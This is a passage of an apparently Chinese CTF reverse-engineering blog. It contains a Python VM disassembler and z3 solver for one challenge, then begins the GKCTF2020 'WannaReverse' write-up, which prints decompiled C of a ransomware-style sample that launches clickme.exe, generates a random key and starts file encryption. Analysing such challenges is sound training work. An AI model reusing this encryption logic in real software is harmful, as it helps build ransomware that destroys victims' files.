class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x26</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x27</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x29</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2a</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2e</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2f</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x30</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x31</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x33</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>,]</span><br><span class="line"></span><br><span class="line">opc =[<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>]</span><br><span class="line">rip = <span class="number">0</span></span><br><span class="line">print(<span class="string">&#x27;reg[1]=18&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> rip&lt;len(opc):</span><br><span class="line">	op = opc[rip]<span class="number">-0x100</span></span><br><span class="line">	print(<span class="string">&#x27;%02x:%02X:&#x27;</span>%(rip,op),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> op==<span class="number">-15</span>:</span><br><span class="line"><span class="comment"># print(&#x27;sub_b5f&#x27;)</span></span><br><span class="line">		cas = opc[rip+<span class="number">1</span>]</span><br><span class="line">		dst = opc[rip+<span class="number">2</span>]</span><br><span class="line">		<span class="keyword">if</span> cas==<span class="number">0xe1</span>:</span><br><span class="line">			print(<span class="string">&#x27;reg[0]=input[%d]&#x27;</span>%dst)</span><br><span class="line">		<span class="keyword">elif</span> cas==<span class="number">0xe2</span>:</span><br><span class="line">			print(<span class="string">&#x27;reg[1]=input[%d]&#x27;</span>%dst)</span><br><span class="line">		<span class="keyword">elif</span> cas==<span class="number">0xe3</span>:</span><br><span class="line">			print(<span class="string">&#x27;reg[2]=input[%d]&#x27;</span>%dst)</span><br><span class="line">		<span class="keyword">elif</span> cas==<span class="number">0xe4</span>:</span><br><span class="line">			print(<span class="string">&#x27;input[%d]=reg[0]&#x27;</span>%dst)</span><br><span class="line">		<span class="keyword">elif</span> cas==<span class="number">0xe5</span>:</span><br><span class="line">			print(<span class="string">&#x27;reg[3]=input[%d]&#x27;</span>%dst)</span><br><span class="line">		<span class="keyword">elif</span> cas==<span class="number">0xe7</span>:</span><br><span class="line">			print(<span class="string">&#x27;input[%d]=reg[1]&#x27;</span>%dst)</span><br><span class="line"></span><br><span class="line">		rip+=<span class="number">6</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-14</span>:</span><br><span class="line">		print(<span class="string">&#x27;xor reg[0],reg[1]&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-11</span>:</span><br><span class="line">		print(<span class="string">&#x27;checkLen&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-12</span>:</span><br><span class="line">		print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-9</span>:</span><br><span class="line">		print(<span class="string">&#x27;mul reg[0],reg[3]&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-8</span>:</span><br><span class="line">		print(<span class="string">&#x27;swap reg[0],reg[1]&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> op==<span class="number">-10</span>:</span><br><span class="line">		print(<span class="string">&#x27;reg[0]=reg[2]+2*reg[1]+3*reg[0]&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">		rip+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#x27;</span></span><br><span class="line">a = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">aa = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(aa)):</span><br><span class="line">	a[i]^=<span class="number">18</span></span><br><span class="line">print(bytes(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = [ord(i) for i in res]</span></span><br><span class="line">a = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2a</span>, <span class="number">0x37</span>, <span class="number">0x9</span>, <span class="number">0x17</span>, <span class="number">0xc5</span>, <span class="number">0xb</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line">print(len(a))</span><br><span class="line"><span class="comment">#for i in range(len(a)):</span></span><br><span class="line"><span class="comment">#	a[i]=a[i]^18</span></span><br><span class="line"><span class="comment"># print(bytes(aa))</span></span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v[<span class="number">0</span>]^v[<span class="number">1</span>])==a[<span class="number">0</span>])</span><br><span class="line">s.add((v[<span class="number">1</span>]^v[<span class="number">2</span>])==a[<span class="number">1</span>])</span><br><span class="line">s.add((v[<span class="number">2</span>]^v[<span class="number">3</span>])==a[<span class="number">2</span>])</span><br><span class="line">s.add((v[<span class="number">3</span>]^v[<span class="number">4</span>])==a[<span class="number">3</span>])</span><br><span class="line">s.add((v[<span class="number">4</span>]^v[<span class="number">5</span>])==a[<span class="number">4</span>])</span><br><span class="line">s.add((v[<span class="number">5</span>]^v[<span class="number">6</span>])==a[<span class="number">5</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">8</span>]+<span class="number">2</span>*v[<span class="number">7</span>]+<span class="number">3</span>*v[<span class="number">6</span>])==a[<span class="number">6</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">9</span>]+<span class="number">2</span>*v[<span class="number">8</span>]+<span class="number">3</span>*v[<span class="number">7</span>])==a[<span class="number">7</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">10</span>]+<span class="number">2</span>*v[<span class="number">9</span>]+<span class="number">3</span>*v[<span class="number">8</span>])==a[<span class="number">8</span>])</span><br><span class="line">s.add(v[<span class="number">10</span>]==a[<span class="number">10</span>])</span><br><span class="line">s.add(v[<span class="number">9</span>]==a[<span class="number">9</span>])</span><br><span class="line"><span class="comment"># s.add(v[12]*(v[11]+2*v[10]+3*v[9])==a[9])</span></span><br><span class="line">s.add(v[<span class="number">16</span>]==a[<span class="number">16</span>])</span><br><span class="line">s.add(v[<span class="number">11</span>]==a[<span class="number">11</span>])</span><br><span class="line">s.add(v[<span class="number">13</span>]==a[<span class="number">19</span>])</span><br><span class="line">s.add(v[<span class="number">19</span>]==a[<span class="number">13</span>])</span><br><span class="line">s.add(v[<span class="number">14</span>]==a[<span class="number">18</span>])</span><br><span class="line">s.add(v[<span class="number">18</span>]==a[<span class="number">14</span>])</span><br><span class="line">s.add(v[<span class="number">15</span>]==a[<span class="number">17</span>])</span><br><span class="line">s.add(v[<span class="number">17</span>]==a[<span class="number">15</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]==a[<span class="number">12</span>])</span><br><span class="line"><span class="comment"># s.add(v[20]==a[20])</span></span><br><span class="line">s.add(v[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">	m = s.model()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">		flag.append(m[i].as_long())</span><br><span class="line">		print(m[i])</span><br><span class="line">print(bytes(flag))</span><br></pre></td></tr></table></figure>
感觉好坑啊

## [rev][GKCTF2020]WannaReverse

1. 打开任意一个都会换壁纸
2. IDA打开WannaReverse.exe，找到主函数
    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_403220</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">void</span> *v1; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">char</span> v6[<span class="number">32</span>]; <span class="comment">// [esp+8h] [ebp-34h]</span></span><br><span class="line"><span class="keyword">char</span> v7; <span class="comment">// [esp+28h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">char</span> v8[<span class="number">10</span>]; <span class="comment">// [esp+2Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">*(_OWORD *)v6 = <span class="number">0</span>i64;</span><br><span class="line">*(_OWORD *)&amp;v6[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">WinExec(<span class="string">&quot;clickme.exe&quot;</span>, <span class="number">1u</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v8, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line">v0 = sub_415930(<span class="number">0</span>);</span><br><span class="line">sub_40BAB0(v0);</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    v6[v2++] = v8[sub_40BA70(v1) % <span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span> ( v2 &lt; <span class="number">32</span> );</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v3 = sub_402D00((<span class="keyword">int</span>)v1, (<span class="keyword">int</span>)v6);</span><br><span class="line">v4 = <span class="string">&quot;encrypto success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">    v4 = <span class="string">&quot;encrypto false!&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(v4);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    首先运行clickme.exe，然后生成一个32位的随即密钥，传入sub_402D00，所以sub_402D00应该是加密函数

3. 查看加密函数

    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_402D00</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *FILE_read; <span class="comment">// eax</span></span><br><span class="line">  FILE *FILE_read_1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> len_0; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> keyLen; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *key; <span class="comment">// esi</span></span><br><span class="line">  